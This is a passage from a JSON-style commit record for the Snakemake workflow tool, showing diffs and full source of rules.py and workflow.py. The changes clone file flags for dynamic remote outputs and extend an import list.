\"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"}, "/snakemake/remote_providers/__init__.py": {"changes": [{"diff": "-0,", "add": 0, "remove": 0, "filename": "/snakemake/remote_providers/__init__.py", "badparts": ["0,"], "goodparts": []}]}, "/snakemake/rules.py": {"changes": [{"diff": "\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re", "add": 6, "remove": 1, "filename": "/snakemake/rules.py", "badparts": ["                        expansion[i].append(IOFile(e, rule=branch))"], "goodparts": ["                        ioFile = IOFile(e, rule=branch)", "                        ioFile.clone_flags(f)", "                        expansion[i].append(ioFile)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"}, "/snakemake/workflow.py": {"changes": [{"diff": "\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd", "add": 1, "remove": 1, "filename": "/snakemake/workflow.py", "badparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"], "goodparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return 